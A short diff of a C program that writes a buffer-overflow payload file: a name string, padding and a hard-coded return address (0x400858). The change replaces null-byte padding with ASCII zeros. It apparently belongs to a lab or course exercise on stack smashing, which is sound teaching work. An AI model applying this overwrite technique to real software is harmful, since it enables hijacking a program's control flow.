@@ -14,9 +14,10 @@ int main(void) {
 
     fprintf(psFile, "Richard Gomez");
     putc('\0', psFile);
-    for(i = 0; i < 35; i++) {
+    fprintf(psFile, "0000000000000000000000000000000000");
+    /* for(i = 0; i < 35; i++) {
         putc('\0', psFile);
-    }
+    } */
     bAddress = 0x400858;
     fwrite(&bAddress, sizeof(unsigned long), 1, psFile);
 
